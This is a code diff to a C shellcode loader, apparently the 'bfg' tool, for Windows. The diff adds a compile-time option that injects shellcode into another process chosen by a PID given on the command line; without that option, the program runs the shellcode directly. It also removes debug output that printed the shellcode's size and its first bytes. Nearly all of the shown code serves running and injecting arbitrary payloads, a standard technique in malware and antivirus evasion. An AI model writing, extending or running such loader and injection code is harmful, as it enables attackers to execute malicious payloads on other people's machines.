@@ -23,14 +23,15 @@ Web: https://github.com/govolution/bfg
 #include <string.h>
 #include <windows.h>
 #include <tchar.h>
-//#include <tlhelp32.h>
 #include "defs.h"
 
 int get_filesize(char *fvalue);
 unsigned char* load_file(char *fvalue, unsigned char *buf, int size2);
 void exec_shellcode(unsigned char *shellcode);
 void exec_shellcode64(unsigned char *shellcode);
+#ifdef INJECT_SHELLCODE
 DWORD inject_sc_process(unsigned char *shellcode, DWORD pid);
+#endif
 
 int main (int argc, char **argv)
 {
@@ -92,11 +93,18 @@ int main (int argc, char **argv)
 		shellcode = buf;	//buf is from defs.h if shellcode is included
 	#endif
 	#endif
+	
+	#ifndef INJECT_SHELLCODE
 	#ifndef X64 
 		exec_shellcode(shellcode);
 	#endif
 	#ifdef X64
 		exec_shellcode64(shellcode);
+	#endif
+	#endif
+	
+	#ifdef INJECT_SHELLCODE
+		inject_sc_process(shellcode, atoi(argv[1]));
 	#endif
 	}
 
@@ -205,16 +213,6 @@ DWORD inject_sc_process(unsigned char *shellcode, DWORD pid)
 	HANDLE hRemoteThread;
 	PVOID pRemoteBuffer;
 	DWORD dwProcessID = pid;
-	printf("%d\n",dwProcessID);
-
-	int i;
-	printf("size: %i\n", szShellcodeLength);
-
-	for (i=0;i<20;i++) 
-	{	
-		printf("0x%02x", pShellcode[i]);
-	}
-	printf("\n");
 
 	if(!dwProcessID) {
 		return 1;
